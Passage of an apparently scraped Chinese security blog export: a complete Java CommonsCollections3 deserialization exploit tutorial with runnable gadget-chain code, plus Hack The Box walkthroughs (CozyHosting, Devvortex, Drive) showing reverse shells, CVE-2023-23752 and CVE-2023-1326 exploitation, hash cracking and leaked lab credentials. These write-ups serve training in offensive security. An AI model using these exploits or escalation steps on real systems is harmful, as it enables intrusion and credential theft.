è·¯ç”±ä¸­æ³„éœ²äº†ç”¨æˆ·kandersonçš„sessionï¼Œå¯ä»¥ç”¨è¿™sessionç™»é™†åˆ°admin;åœ¨adminé¡µé¢å¤„çš„sshåŠŸèƒ½åº”è¿‡æ»¤ä¸å½“å­˜åœ¨rceæ¼æ´ï¼Œä»¥è‡³äºå¯ä»¥åå¼¹shell,å¾—åˆ°appç”¨æˆ·ï¼›åˆèƒ½åœ¨appç”¨æˆ·ä¸­å¾—åˆ°cloudhosting-0.0.1.jar,è€Œcloudhosting-0.0.1.jarå­˜åœ¨æ•æ„Ÿä¿¡æ¯ï¼›è´¦å·ï¼špostgresï¼Œå¯†ç ï¼šVg&amp;nvzAQ7XxR;å°è¯•sshè¿æ¥ä¸æˆåŠŸï¼Œè¿æ¥æ•°æ®åº“(è¿™é‡Œæ³¨æ„æ˜¯psqlï¼Œä»è¿›ç¨‹ä¸­å¾—åˆ°è¿™ä¸ªä¿¡æ¯)ï¼›åœ¨æ•°æ®åº“é‡Œèƒ½æ‰¾åˆ°ç”¨æˆ·joshçš„å¯†ç :manchesterunited;sshè¿æ¥æˆåŠŸ,sudo -lå‘ç°å¯ä»¥ä»¥rootèº«ä»½è¿è¡Œsshå‘½ä»¤ï¼Œåœ¨ç½‘ä¸Šå¯ä»¥æ‰¾åˆ°å¯¹åº”çš„ææƒæ–¹æ³•ï¼Œæœ€ç»ˆæ‹¿åˆ°rootã€‚","link":"/2023/12/11/CozyHosting(HTB)/"},{"title":"CommonsCollections3","text":"äº†è§£ç±»æ˜¯å¦‚ä½•åŠ è½½çš„ 1234567 //è¿”å›çš„ç³»ç»Ÿç±»åŠ è½½å™¨ä¹Ÿæ˜¯AppClassLoaderClassLoader c = ClassLoader.getSystemClassLoader(); //åŠ¨è°ƒçœ‹ä¸€ä¸‹ï¼Œæœ€ç»ˆè°ƒç”¨ClassLoaderä¸­çš„defineClass//loadClass ==&gt; findClass ==&gt; defineClass Class&lt;?&gt; cl = c.loadClass(&quot;Calc&quot;);//å¿…é¡»å®ä¾‹åŒ–ï¼›å¦åˆ™ä¸ä¼šæ‰§è¡Œä»»ä½•æ“ä½œçš„ï¼Œ cl.newInstance(); è°ƒè¯•å¾—çŸ¥ï¼Œæœ€ç»ˆæ˜¯è°ƒç”¨äº†ClassLoader.defineClassæ–¹æ³•åŠ è½½çš„å­—èŠ‚ç æ–‡ä»¶ å°è¯•åŠ è½½ä»»æ„ç›®å½•çš„å­—èŠ‚ç æ–‡ä»¶ï¼› 123456789101112131415161718192021 URLClassLoader cl = new URLClassLoader(new URL[]{new URL(&quot;file:///E:\\\\tmp\\\\&quot;)}); Class&lt;?&gt; c = cl.loadClass(&quot;Hello&quot;); c.newInstance();/* å¯ä»¥çœ‹çœ‹URLClassLoaderçš„æ„é€ å‡½æ•°ï¼›ä¹Ÿæ˜¯è°ƒç”¨äº†System.getSecurityManager(); è¿”å›çš„ç³»ç»Ÿç±»åŠ è½½å™¨ä¹Ÿæ˜¯AppClassLoader å¹¶ä¸”ä¿®æ”¹äº†ucpçš„å€¼ï¼›æ‰€ä»¥åœ¨è°ƒç”¨findClassæ–¹æ³•æ—¶ä¹Ÿä¼šæœ‰å¯¹åº”çš„å½±å“ //Resource res = ucp.getResource(path, false); public URLClassLoader(URL[] urls) { super(); // this is to make the stack depth consistent with 1.1 SecurityManager security = System.getSecurityManager(); if (security != null) { security.checkCreateClassLoader(); } ucp = new URLClassPath(urls); this.acc = AccessController.getContext(); }*/ å°è¯•ç›´æ¥åˆ©ç”¨åå°„è°ƒç”¨ClassLoader.defineClassæ–¹æ³•åŠ è½½å­—èŠ‚ç æ–‡ä»¶ æ³¨æ„ï¼šå€’æ•°ç¬¬äºŒè¡Œï¼Œä¼ é€’å‚æ•°æ—¶ï¼›ç±»åâ€Calcâ€ä¹Ÿå¯ä»¥ä¸ºç©º GPTè§£é‡Šï¼šå°†ç±»åä¼ å…¥ä¸ºnullï¼Œè¿™å®é™…ä¸Šæ˜¯åœ¨å‘Šè¯‰è™šæ‹Ÿæœºä¸è¦ä½¿ç”¨ç±»åæ¥éªŒè¯ç±»å®šä¹‰ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨å­—èŠ‚ç æ•°æ®è¿›è¡Œç±»çš„å®šä¹‰ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œè™šæ‹Ÿæœºä¼šç›´æ¥ä½¿ç”¨å­—èŠ‚ç æ•°æ®æ¥åˆ›å»ºClasså¯¹è±¡ï¼Œç„¶åå°†å…¶åŠ è½½åˆ°è™šæ‹Ÿæœºä¸­ã€‚ 12345678ClassLoader cl = ClassLoader.getSystemClassLoader();Class&lt;ClassLoader&gt; c = ClassLoader.class;Method declaredMethod = c.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);declaredMethod.setAccessible(true);byte[] codes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;)); Class invoke =(Class) declaredMethod.invoke(cl, &quot;Calc&quot;, codes, 0, codes.length);invoke.newInstance(); ç›´æ¥æ­£ç€çœ‹CC3é“¾ï¼› TemplatesImplæ„é€ å‡½æ•°ä¸ºç©º(å¹¶æ²¡æœ‰ç»™ä¸€äº›å±æ€§å€¼èµ‹å€¼) 1public TemplatesImpl() { } TemplatesImplä¸‹çš„publicä¿®é¥°çš„newTransformeræ–¹æ³•ï¼Œè°ƒç”¨äº†getTransletInstanceæ–¹æ³• 1234567891011121314151617public synchronized Transformer newTransformer() throws TransformerConfigurationException{ TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, // &lt;&lt;== _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer;} getTransletInstanceæ–¹æ³•è°ƒç”¨äº†defineTransletClassesæ–¹æ³• 123456789private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); // &lt;&lt;== AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); // &lt;&lt;== ...... æ³¨æ„ï¼š å‰ææ˜¯_nameä¸ä¸ºç©ºï¼Œå±æ€§å€¼é»˜è®¤æ˜¯ä¸ºç©ºçš„ï¼Œå†åŠ ä¸Šæ„é€ å‡½æ•°ä»€ä¹ˆä¹Ÿæ²¡å¹²(å¹¶æ²¡æœ‰ç»™ä¸€äº›å±æ€§å€¼èµ‹å€¼); æ‰€ä»¥éœ€è¦åå°„ä¿®æ”¹_nameçš„å€¼ï¼Œä½¿å¾—å€¼ä¸ä¸ºç©º åœ¨getTransletInstanceæ–¹æ³•ä¸­è¿˜æœ‰ä¸€ä¸ªå®ä¾‹åŒ–çš„æ“ä½œï¼š_class[_transletIndex].newInstance(); defineTransletClassesæ–¹æ³•ä¸­è°ƒç”¨äº†defineClassæ–¹æ³• 1234567891011121314151617181920212223242526272829303132333435363738394041private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount &gt; 1) { _auxClasses = new HashMap&lt;&gt;(); } for (int i = 0; i &lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]); // &lt;&lt;== final Class superClass = _class[i].getSuperclass(); if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex &lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } ...... æ³¨æ„ï¼š _bytecodeså…¶å®å°±æ˜¯æˆ‘ä»¬è¦åŠ è½½çš„æ¶æ„çš„å­—èŠ‚ç æ•°ç»„ï¼Œæ‰€ä»¥è‚¯å®šè¦åå°„èµ‹å€¼ï¼› è¿˜éœ€è¦æ³¨æ„ä¸èƒ½ä½¿å¾—_tfactoryä¸ºç©ºï¼Œå¦åˆ™åœ¨è°ƒç”¨æ–¹æ³•æ˜¯ä¼šæŠ¥ç©ºæŒ‡é’ˆå¼‚å¸¸ï¼› ä½†æ˜¯_tfactoryè¢«â€transientâ€ä¿®é¥°äº†ï¼Œå…¶å®ä¹Ÿæ— éœ€æ‹…å¿ƒ;å› ä¸ºåœ¨readObjectä¸­ä¸º_tfactory èµ‹å€¼äº†ï¼›â€_tfactory = new TransformerFactoryImpl();â€ è¿˜æœ‰_auxClasseså±æ€§ä¹Ÿè°ƒç”¨äº†ä¸€ä¸ªæ–¹æ³•ï¼Œä¹Ÿè¢«â€transientâ€ä¿®é¥°äº†ï¼Œå¹¶ä¸”readObjectå¹¶æ²¡æœ‰å¯¹_auxClasseså±æ€§æœ‰èµ‹å€¼çš„æ“ä½œï¼›å†åŠ ä¸Š_transletIndexé»˜è®¤å€¼ä¸º-1;æœ€åä¸€ä¸ªifè¯­å¥ä¼šä¸ºçœŸï¼Œä¹Ÿä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæ‰€ä»¥å°è¯•ä½¿å¾—superClass.getName().equals(ABSTRACT_TRANSLET)ä¸ºçœŸï¼Œè¿™æ ·å°±ä¸ä¼šèµ°åˆ°elseä¸­ï¼Œä¹Ÿä¼šä¿®æ”¹_transletIndexçš„å€¼ä¸º0; è¦ä½¿å¾—å­—èŠ‚ç æ–‡ä»¶ä¸­çš„ç±»çš„çˆ¶ç±»æ˜¯AbstractTranslet 123private static String ABSTRACT_TRANSLET = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;; superClass = _class[i].getSuperclass(); superClass.getName().equals(ABSTRACT_TRANSLET) defineClassæœ€åä¼šè°ƒç”¨ClassLoader.defineClass;å­—èŠ‚ç åŠ è½½å®Œä¹‹åï¼Œå›åˆ°getTransletInstanceæ–¹æ³•ä¸­è°ƒç”¨newInstanceæ–¹æ³•ï¼Œå®ç°å®ä¾‹åŒ–ï¼› 123Class defineClass(final byte[] b) { return defineClass(null, b, 0, b.length);} Gadget chain: 12345678910111213ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator.setValue() TransformedMap.checkSetValue() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() TemplatesImpl.newTransformer TemplatesImpl.getTransletInstance TemplatesImpl.defineTransletClasses TemplatesImpl.defineClass ClassLoader.defineClass TemplatesImpl.getTransletInstance.newInstance å…ˆç”Ÿæˆä¸€ä¸ªå­—èŠ‚ç æ–‡ä»¶ å†æ„é€ ä»£ç å—ä¸­å†™è¦æ‰§è¡Œçš„å‘½ä»¤(å†ç©ºå‚å‡½æ•°ä¸­å†™ä¹Ÿæ²¡é—®é¢˜)ï¼›ç„¶åç»§æ‰¿AbstractTransletç±»ï¼Œè¿™æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œè¿˜è¦å®ç°æŠ½è±¡æ–¹æ³• 123456789101112131415161718192021222324252627282930import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class Calc extends AbstractTranslet { { try { Runtime.getRuntime().exec(&quot;calc&quot;); } catch (IOException e) { throw new RuntimeException(e); } } public Calc(){} @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }} ç„¶ååå°„å°±æ˜¯ä¿®æ”¹ä¸€ä¸‹TemplatesImplçš„å±æ€§å€¼ 123456789101112131415161718TemplatesImpl templates = new TemplatesImpl();Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass();Field name = tCalss.getDeclaredField(&quot;_name&quot;);name.setAccessible(true);name.set(templates,&quot;deadbeef&quot;);Field tfactory = tCalss.getDeclaredField(&quot;_tfactory&quot;);tfactory.setAccessible(true);tfactory.set(templates,new TransformerFactoryImpl());byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;));byte[][] codes = {bytes};Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;);bytecodes.setAccessible(true);bytecodes.set(templates,codes);templates.newTransformer(); æœ€åè¿˜æ˜¯åˆ©ç”¨CC1ååŠéƒ¨åˆ†çš„é“¾è°ƒç”¨templatesçš„newTransformeræ–¹æ³•ï¼Œåéƒ¨åˆ†é“¾ç”¨CC6åº”è¯¥å¯ä»¥ï¼› 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package demo1;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import javax.xml.transform.TransformerConfigurationException;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class Test7 { public static void main(String[] args) throws ClassNotFoundException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException, TransformerConfigurationException { TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass(); Field name = tCalss.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;deadbeef&quot;); byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;)); byte[][] codes = {bytes}; Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,codes); Transformer[] transformers = { new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;,null,null) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;value&quot;,&quot;deadbeef&quot;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationInvocationHandler = clazz.getDeclaredConstructor(Class.class, Map.class); annotationInvocationHandler.setAccessible(true); Object o = annotationInvocationHandler.newInstance(Target.class,transformedMap); serialize(o); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); oos.close(); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); ois.close(); }} ä¸Šé¢çš„pocæœ€åæ˜¯ç”¨InvokerTransformerç±»çš„transformè°ƒç”¨çš„templatesçš„newTransformeræ–¹æ³•ï¼› å¦‚æœwafè¿‡æ»¤äº†â€InvokerTransformerâ€ è¿˜æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥é€šè¿‡InstantiateTransformerç±»çš„transformè°ƒç”¨TrAXFilterçš„æ„é€ æ–¹æ³•ç±»è°ƒç”¨templatesçš„newTransformeræ–¹æ³•ï¼› TrAXFilterè°ƒç”¨äº†newTransformeræ–¹æ³•ï¼Œè€Œä¸”templatesæ˜¯å¯æ§çš„ 12345678public TrAXFilter(Templates templates) throws TransformerConfigurationException{ _templates = templates; _transformer = (TransformerImpl) templates.newTransformer(); _transformerHandler = new TransformerHandlerImpl(_transformer); _useServicesMechanism = _transformer.useServicesMechnism();} 123456789101112131415161718192021 TemplatesImpl templates = new TemplatesImpl(); Class&lt;? extends TemplatesImpl&gt; tCalss = templates.getClass(); Field name = tCalss.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;deadbeef&quot;); Field tfactory = tCalss.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\tmp\\\\Calc.class&quot;)); byte[][] codes = {bytes}; Field bytecodes = tCalss.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,codes);//templates.newTransformer Class&lt;?&gt; trAXFilterClass = TrAXFilter.class; Constructor&lt;?&gt; constructor = trAXFilterClass.getConstructor(Templates.class); constructor.newInstance(templates); InstantiateTransformerçš„transformæ–¹æ³•ï¼Œå¯ä»¥è°ƒç”¨ä»»æ„ä¸€ä¸ªç±»çš„æœ‰å‚æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥å°±å¯ä»¥å°è¯•è°ƒç”¨TrAXFilterçš„æ„é€ æ–¹æ³•ï¼Œå¹¶æŠŠtemplatesä¼ é€’è¿‡å» 12345678910111213141516public InstantiateTransformer(Class[] paramTypes, Object[] args) { super(); iParamTypes = paramTypes; iArgs = args;}public Object transform(Object input) { try { if (input instanceof Class == false) { throw new FunctorException( &quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot; + (input == null ? &quot;null object&quot; : input.getClass().getName())); } Constructor con = ((Class) input).getConstructor(iParamTypes); return con.newInstance(iArgs); ...... æœ€åå°†pocä¸­çš„transformersæ•°ç»„æ”¹æˆä¸‹é¢è¿™æ ·ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼› 1234Transformer[] transformers = { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})};","link":"/2024/02/29/CommonsCollections3/"},{"title":"Devvortex(HTB)","text":"ä¿¡æ¯æœé›†80ç«¯å£123456789sudo nmap -p- -sT --min-rate 5000 10.10.11.242Nmap scan report for devvortex.htb (10.10.11.242)Host is up (0.36s latency).Not shown: 64138 closed tcp ports (conn-refused), 1395 filtered tcp ports (no-response)PORT STATE SERVICE22/tcp open ssh80/tcp open httpNmap done: 1 IP address (1 host up) scanned in 77.24 seconds è®¿é—®http://10.10.11.242 å¾—åˆ°http://devvortex.htb/,æ·»åŠ åˆ°/etc/hostsä¸­ å­åŸŸåå¯»æ‰¾ä¸€ç•ªè¿‡åæ²¡æœ‰æ‰¾åˆ°åˆ©ç”¨ç‚¹ï¼Œå°è¯•ä¿¡æ¯æœé›† 1ffuf -u http://devvortex.htb -H &quot;Host: FUZZ.devvortex.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fc 302 å°†http://dev.devvortex.htb/æ·»åŠ åˆ°hostsæ–‡ä»¶ï¼Œä¿¡æ¯æœé›†ï¼Œå¾—åˆ°åå°åœ°å€ï¼ŒJoomla cms CVE-2023-237521http://dev.devvortex.htb/administrator/ searchsploit Joomlaæ‰«å‡ºä¸€å †æ¼æ´ï¼Œæœ€ç»ˆç¡®å®šä¸ºCVE-2023-23752 1Joomla! v4.2.8 - Unauthenticated information disclosure |php/webapps/51334.py å‘ç°ä¸¤ä¸ªç”¨æˆ·ï¼Œå¾—åˆ°ç”¨æˆ·ä¸ºlewisçš„å¯†ç ä¸ºP4ntherg0t1n5r3c0n## 123456789101112131415161718192021â””â”€$ ./51334.py http://dev.devvortex.htb Users[649] lewis (lewis) - lewis@devvortex.htb - Super Users[650] logan paul (logan) - logan@devvortex.htb - RegisteredSite infoSite name: DevelopmentEditor: tinymceCaptcha: 0Access: 1Debug status: falseDatabase infoDB type: mysqliDB host: localhostDB user: lewisDB password: P4ntherg0t1n5r3c0n##DB name: joomlaDB prefix: sd4fg_DB encryption 0 www-datawebshellè¿æ¥sshå¤±è´¥åï¼Œä½¿ç”¨è´¦å·å¯†ç è¿›å…¥åå°ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹â€/templates/cassiopeia/error.php,å†™å…¥åå¼¹shellï¼Œå†è®¿é—®è¿™ä¸ªæ–‡ä»¶ï¼Œå³å¯getwebshell,ä½†æ˜¯æ—¶www-dataç”¨æˆ·ï¼Œ 123456789101112â”Œâ”€â”€(kaliã‰¿kali)-[/usr/â€¦/exploitdb/exploits/php/webapps]â””â”€$ nc -lnnp 5555Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 07:17:27 up 58 min, 3 users, load average: 0.00, 0.02, 0.03USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATlogan pts/1 10.10.14.26 07:06 9:51 0.05s 0.05s -bashlogan pts/2 10.10.14.26 07:10 5:48 0.05s 0.05s -bashlogan pts/3 10.10.14.26 07:15 1:42 0.04s 0.04s -bashuid=33(www-data) gid=33(www-data) groups=33(www-data)sh: 0: can't access tty; job control turned off$ whoamiwww-data æ•°æ®åº“ç™»é™†æ•°æ®åº“ï¼Œå¯»æ‰¾loganç”¨æˆ·çš„å¯†ç  1234567891011mysql -h localhost -u lewis -pEnter password: P4ntherg0t1n5r3c0n##mysql&gt; select username,password from sd4fg_users;select username,password from sd4fg_users;+----------+--------------------------------------------------------------+| username | password |+----------+--------------------------------------------------------------+| lewis | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u || logan | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |+----------+--------------------------------------------------------------+ johnçˆ†ç ´å¯†ç å°†logançš„å¯†ç å†™å…¥åˆ°hashæ–‡ä»¶ï¼Œåˆ©ç”¨johnå·¥å…·çˆ†ç ´ï¼Œå¾—åˆ°å¯†ç ï¼štequieromucho 1234567891011â”Œâ”€â”€(kaliã‰¿kali)-[~/æ¡Œé¢]â””â”€$ john hash --wordlist=/usr/share/wordlists/rockyou.txtUsing default input encoding: UTF-8Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])Cost 1 (iteration count) is 1024 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statustequieromucho (?) 1g 0:00:00:07 DONE (2023-12-08 15:35) 0.1254g/s 176.1p/s 176.1c/s 176.1C/s lacoste..harryUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed. su loganåˆ‡æ¢åˆ°loganæ˜¯é‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œéœ€è¦å‡çº§shellæ‰èƒ½æˆåŠŸåˆ‡æ¢ç”¨æˆ·ï¼› å†dockerä¸­su username,å¯èƒ½ä¼šæŠ¥must be run from terminal;è§£å†³æ–¹æ¡ˆï¼šclink me ç”¨çš„æ¯”è¾ƒå¤šçš„è§£å†³æ–¹æ¡ˆï¼š 1python3 -c &quot;import pty; pty.spawn('/bin/bash')&quot; loganç™»é™†æˆåŠŸåsudo -lï¼Œå‘ç°å¯ä»¥æ‰§è¡Œ/usr/bin/apport-cli 1234567891011logan@devvortex:/$ sudo -lsudo -l[sudo] password for logan: tequieromuchoMatching Defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser logan may run the following commands on devvortex: (ALL : ALL) /usr/bin/apport-cli Googleä¸€ä¸‹sudo apport-cliï¼Œç»è¿‡æœé›†ï¼Œå¾—åˆ°ä¸€ä¸ªCVE-2023-1326 CVE-2023-13261.ä½¿ç”¨å‘½ä»¤ç”Ÿæˆ.crashæ–‡ä»¶ 12345678#ç¬¬ä¸€ç§sleep 100 &amp;ps aux|grep sleepkill -SEGV &lt;pid&gt;#ç¬¬äºŒç§sleep 100 &amp;killall -SIGSEGV sleep è¯¥æ–‡ä»¶åœ¨/var/crashç›®å½•ä¸‹ã€‚ 2.ä½¿ç”¨apport-cliå¤„ç†è¯¥æ–‡ä»¶ï¼Œé€‰æ‹©Vé€‰é¡¹ï¼Œè¯¥ç¨‹åºä¼šä½¿ç”¨lessä½œä¸ºæŸ¥çœ‹æŠ¥å‘Šçš„æ–¹å¼ã€‚ 1234sudo apport-cli -c /var/crash/xxx.crashè¾“å…¥ï¼švç­‰ä¸€æ®µæ—¶é—´åè¾“å…¥ï¼š!/bin/bashå³å¯å¾—åˆ°shell æ€»ç»“nmapå‘ç°å¼€æ”¾80ç«¯å£ï¼Œæ˜¯ä¸€ä¸ªé™æ€é¡µé¢ï¼Œæ²¡æœ‰æ‰¾åˆ°åˆ©ç”¨ç‚¹ï¼Œæ¥ç€ä¿¡æ¯æœé›†æ‰¾åˆ°ä¸€ä¸ªå­åŸŸådev,åœ¨è¿™ä¸ªå­åŸŸåä¸‹æ‰¾åˆ°joomla cms,å¹¶ä¸”å¯ä»¥å‘ç°åå°ç™»é™†é¡µé¢ï¼Œå†ç½‘ä¸Šå¯ä»¥æ‰¾åˆ°CVE-2023-23752,æˆ–è€…åˆ©ç”¨å·¥å…·searchsploit Joomlaå¾—åˆ°è´¦å·å¯†ç ï¼Œsshç™»é™†æ— æœä¹‹åï¼Œç”¨è´¦å·å¯†ç è¿›å…¥åå°å‘ç°â€/templates/cassiopeia/error.phpå¯ä»¥åˆ©ç”¨;è¿æ¥webshellï¼Œä»æ•°æ®åº“ä¸­å¯ä»¥å‘ç°logançš„å¯†ç ï¼Œjohnçˆ†ç ´å¯†ç ï¼Œç™»é™†loganè´¦å·ï¼Œsudo -låå‘ç°å¯ä»¥sudo apport-cliå†æ¬¡åˆ©ç”¨CVE-2023-1326æå‡æƒé™åˆ°root","link":"/2023/12/08/Devvortex(HTB)/"},{"title":"Drive(HTB)","text":"ä¿¡æ¯æœé›†nmap12345678910111213141516nmap -sC -sV 10.10.11.235Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-15 14:49 CSTNmap scan report for drive.htb (10.10.11.235)Host is up (0.18s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)| 256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)|_ 256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Doodle Grive|_http-server-header: nginx/1.18.0 (Ubuntu)3000/tcp filtered pppService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel å¯»æ‰¾æ¼æ´http://drive.htb/ä¸€ä¸ªæ³¨å†Œå’Œç™»é™†çš„åŠŸèƒ½ï¼Œéšæ„æ³¨å†Œä¸€ä¸ªè´¦å·å°è¯•ç™»é™† æˆ‘ä»¬å°è¯•ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶å¹¶ä¸”æŸ¥çœ‹ï¼Œ æ³¨æ„æŸ¥çœ‹çš„urlä¸€ä¸ªæ–‡ä»¶ä¼¼ä¹å¯¹åº”ç€ä¸€ä¸ªIDï¼›æˆ‘ä»¬å°è¯•ä»åˆ«çš„IDçš„å¾—åˆ«çš„æ–‡ä»¶æ¥æ³„éœ²ä¸€äº›æ•æ„Ÿæ–‡ä»¶ åˆ©ç”¨bpå·¥å…·çš„Intruderæ¨¡å—æ¥çˆ†ç ´ï¼› 200ï¼šè¡¨ç¤ºæ‚¨æœ‰æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚ 401ï¼šè¡¨ç¤ºå¯¹æ–‡ä»¶çš„è®¿é—®è¢«æ‹’ç»ï¼Œè¿™æ˜¯æˆ‘ä»¬ä¸»è¦å¯»æ‰¾çš„ã€‚ 500ï¼šè¡¨ç¤ºæ²¡æœ‰ä¸è¯¥ç‰¹å®šIDå…³è”çš„æ–‡ä»¶ã€‚ å‘ç°IDä¸º79,98,99,101ä¸‹æœ‰æ–‡ä»¶ä½†æ˜¯æˆ‘ä»¬æ— æƒæŸ¥çœ‹ï¼Œé€šè¿‡å¹¿æ³›çš„æšä¸¾ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªæ½œåœ¨çš„æ”»å‡»è½½ä½“ï¼Œå…¶å½¢å¼ä¸º/blocké“¾æ¥ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæ­¤é“¾æ¥ä¸ä¼šéªŒè¯æ–‡ä»¶çš„æ‰€æœ‰è€…ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯èƒ½ä¼šä¿ç•™æˆ‘ä»¬æ— æ³•è®¿é—®çš„æ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¿™ä¸ªæ¼æ´å¯¼è‡´æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹åˆ°å…¶ä»–æ–‡ä»¶ åœ¨IDä¸º79çš„æ–‡ä»¶ä¸‹å¾—åˆ°äº†æ•æ„Ÿä¿¡æ¯ï¼›è®¿é—®http://drive.htb/79/block/ 123456hey team after the great success of the platform we need now to continue the work.on the new features for ours platform.I have created a user for martin on the server to make the workflow easier for you please use the password &quot;Xk4@KjyrYv8t194L!&quot;.please make the necessary changes to the 